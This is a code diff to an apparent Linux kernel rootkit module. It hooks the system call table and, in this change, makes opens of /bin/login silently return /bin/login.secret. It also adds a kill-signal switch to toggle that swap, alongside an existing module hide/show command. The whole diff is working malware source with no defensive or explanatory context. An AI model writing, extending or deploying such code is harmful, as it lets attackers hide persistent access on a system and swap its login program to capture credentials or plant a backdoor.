@@ -25,8 +25,9 @@ orig_kill_t orig_kill;
 orig_open_t orig_open;
 
 
-#define FILE_FROM "/bin/bash"
-#define FILE_TO "/bin/mash"
+#define FILE_FROM "/bin/login"
+#define FILE_TO "/bin/login.secret"
+int hide_loginfile = 0;
 
 //function to get the address of the system call table
 unsigned long *
@@ -216,20 +217,19 @@ hacked_open(const char *path,int flags,mode_t mode){
 
 	ret = orig_open(path,flags,mode);
 
-	if(ret < 0){
+	if(!hide_loginfile || ret < 0){
 		return ret;
 	}
 
-	bash_path = filp_open(FILE_FROM,O_PATH,0);
+	bash_path = filp_open(FILE_FROM,O_RDONLY|O_PATH,0);
 	if(!bash_path){
 			//printk("RootKit open error");
 			return ret;
 	}
-
 	redir = path_equal(&(bash_path->f_path),&(current->files->fdt->fd[ret]->f_path));
 	filp_close(bash_path,NULL);
-
 	//printk("redir = %d\n",redir);
+
 	if(redir){
 		((orig_close_t)__sys_call_table[__NR_close])(ret);
 
@@ -262,6 +262,9 @@ hacked_kill(pid_t pid, int sig)
 		case HIDEMOD:
 			if (module_hidden) module_show();
 			else module_hide();
+			break;
+		case HIDE_LOGINFILE:
+			hide_loginfile = !hide_loginfile;
 			break;
 		default:
 			return orig_kill(pid, sig);
